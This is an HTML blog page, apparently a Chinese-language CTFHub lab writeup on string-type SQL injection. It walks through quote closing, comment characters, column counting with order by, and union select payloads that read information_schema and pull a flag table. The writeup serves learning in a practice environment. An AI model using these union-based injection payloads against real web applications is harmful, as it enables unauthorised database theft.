@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-SQL注入字符型 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-SQL注入字符型 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.23 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, SQL注入, 字符型, 引号闭合, 注释符, Union联合查询</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - SQL注入 / 字符型注入</li>
+        <li><strong>题目名称：</strong>字符型注入</li>
+        <li><strong>环境：</strong>通过 Open Browser 打开外部浏览器访问靶场环境。</li>
+        <li><strong>目标：</strong>页面提供 ID 输入框，后端直接将输入拼接到 SQL 语句中，参数被单引号包裹。需要闭合引号、注释多余代码，利用联合查询获取 Flag。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>字符型注入原理：</strong>后端接收参数后，未进行严格过滤，直接将输入拼接进 SQL 语句。由于参数被单引号 <code>'</code> 包裹，注入时必须先闭合引号，再用注释符 <code>#</code> 或 <code>--+</code> 注释掉原代码尾部多余的引号，从而构造出合法的 SQL 语句。</p >
+    
+    <p><strong>核心逻辑：单引号必须成对出现（闭合原理）</strong></p >
+    <p>通过探测，后端拼接逻辑可抽象为：<code>WHERE id = '[输入]'</code></p >
+    <ul>
+        <li><strong>输入 <code>1</code>：</strong>拼接为 <code>WHERE id = '1'</code>，2个单引号，完美配对，正常执行。</li>
+        <li><strong>输入 <code>1'</code>：</strong>拼接为 <code>WHERE id = '1''</code>，总共出现3个单引号，导致最后一个无法配对，语法解析失败，页面报错/空白。</li>
+        <li><strong>输入 <code>1' and '1'='1</code>：</strong>拼接为 <code>WHERE id = '1' and '1'='1'</code>，4个单引号，完美配对（原码头配输入头，输入的第二个引号与尾部的引号配对），逻辑为真，页面恢复正常。</li>
+        <li><strong>注释的作用（<code>#</code>）：</strong>在构造复杂Payload时，直接输入尾部会有原代码多出的单引号，加上 <code>#</code> 将其注释掉，就能保障我们构造的语句不会因单引号未闭合而崩溃。</li>
+    </ul>
+
+    <div class="diff-box">
+        <strong> 整数型 vs 字符型 核心对比：</strong>
+        <ul>
+            <li><strong>相同点：</strong>漏洞本质相同（拼接执行），脱库流程完全一致（判断列数 -> 找回显点 -> 查 information_schema 库）。</li>
+            <li><strong>不同点（核心）：</strong>
+                <ul>
+                    <li>拼接形式：整数型无引号（<code>id=1</code>）；字符型有引号（<code>id='1'</code>）。</li>
+                    <li>闭合要求：整数型直接输入；字符型必须用 <code>'</code> 闭合前面的引号。</li>
+                    <li>尾部处理：整数型不需要处理；字符型必须使用 <code>#</code> 或 <code>--+</code> 注释掉尾随的引号。</li>
+                    <li>探测 Payload：整数型 <code>1 and 1=1</code>；字符型 <code>1' and '1'='1</code>。</li>
+                </ul>
+            </li>
+        </ul>
+    </div>
+
+    <h2>3. 操作步骤</h2>
+    
+    <p><strong>第一步：漏洞探测（判断存在字符型注入）</strong></p >
+    <ul>
+        <li>输入 <code>1</code>：回显 <code>select * from news where id='1'</code>，结果正常。</li>
+        <li>输入 <code>1'</code>：回显 <code>select * from news where id='1''</code>，页面报错/空白。说明多出来的单引号破坏了SQL语法。</li>
+    </ul>
+    <p><strong>结论：</strong>确认为字符型注入。输入的 <code>'</code> 成功闭合了原语句的 <code>id='</code>。</p >
+
+    <p><strong>第二步：闭合验证与逻辑测试</strong></p >
+    <ul>
+        <li>输入 <code>1' and '1'='1</code>：页面正常显示数据（逻辑为真）。</li>
+        <li>输入 <code>1' and '1'='2</code>：页面无数据/空白（逻辑为假）。</li>
+    </ul>
+    <p><strong>结论：</strong>确认注入条件被执行，我们成功控制了查询逻辑。</p >
+
+    <p><strong>第三步：注释尾随单引号（关键步骤）</strong></p >
+    <p>输入 <code>1' #</code>，页面正常显示数据。</p >
+    <p><strong>原理：</strong><code>#</code> 将原代码尾部多出来的单引号注释掉，使我们后续构造的 Payload 不会被破坏。在 URL 中，空格会被编码为 <code>+</code>，<code>#</code> 会被编码为 <code>%23</code>（例如 <code>1%27+%23</code>）。备选方案是 <code>1' --+</code>。</p >
+
+    <p><strong>第四步：判断字段数（列数）</strong></p >
+    <ul>
+        <li>输入 <code>1' order by 2 #</code>：页面正常回显。</li>
+        <li>输入 <code>1' order by 3 #</code>：页面无数据回显。</li>
+    </ul>
+    <p><strong>结论：</strong>当前表有 <strong>2 个字段</strong>。</p >
+
+    <p><strong>第五步：寻找黄金回显点</strong></p >
+    <p>输入 <code>-1' union select 1,2 #</code>，页面回显 <code>ID: 1</code>，<code>Data: 2</code>。</p >
+    <p><strong>原理解析：</strong><code>-1</code> 使前半句查询为空，<code>union select 1,2</code> 将结果拼接到2列中，数字 <code>1</code> 和 <code>2</code> 成功在页面回显。</p >
+
+    <p><strong>第六步：联合查询脱库</strong></p >
+    <p>利用回显点，查询库名、表名、字段名和数据：</p >
+    <ul>
+        <li><strong>查库名：</strong>输入 <code>-1' union select 1,database() #</code>，回显 <code>Data: sqli</code>。确定当前数据库为 <code>sqli</code>。</li>
+        <li><strong>查表名：</strong>输入 <code>-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code>，回显 <code>Data: flag,news</code>。发现目标表 <code>flag</code>。</li>
+        <li><strong>查字段名：</strong>输入 <code>-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' #</code>，回显 <code>Data: flag</code>。确定字段名为 <code>flag</code>。</li>
+        <li><strong>获取数据：</strong>输入 <code>-1' union select 1,flag from flag #</code>，成功获得最终Flag并提交。</li>
+    </ul>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：为什么 <code>1'</code> 会报错？</strong>因为添加的单引号导致 SQL 语句中的单引号变成了奇数个，无法成对配对，语法解析失败。</li>
+        <li><strong>坑2：为什么 <code>1' and '1'='1</code> 又能正常？</strong>因为补全的新语句刚好与原有的单引号凑成了偶数个，完美闭合。这说明我们成功操控了闭合并注入了逻辑代码。</li>
+        <li><strong>坑3：尾随单引号问题。</strong>字符型注入必须使用 <code>#</code> 或 <code>--+</code> 注释掉原代码尾部多余的单引号，否则无法构造复杂的 Payload（如联合查询）。</li>
+        <li><strong>为什么必须用-1：</strong>联合查询必须保证前后列数一致（这里为2列）。用不存在的 <code>-1</code> 能让前半句查询失败，强制页面显示我们注入的 <code>select 1,2</code> 结果。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>字符型注入标准流程：</strong>探测报错（输入 <code>'</code>） -> 验证逻辑（<code>' and '1'='1</code>） -> 闭合注释（<code>' #</code>） -> 判断列数（<code>order by</code>） -> 找回显位置（<code>union select</code>） -> 查库名、表名、字段名 -> 脱取数据。</li>
+        <li><strong>注释符的使用：</strong><code>#</code> 和 <code>--+</code>（URL 编码后）是字符型注入中必不可少的工具。</li>
+        <li><strong>系统库信息：</strong>熟练记忆 <code>database()</code> 函数，以及 <code>information_schema.tables</code> 和 <code>information_schema.columns</code> 这两张核心表。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
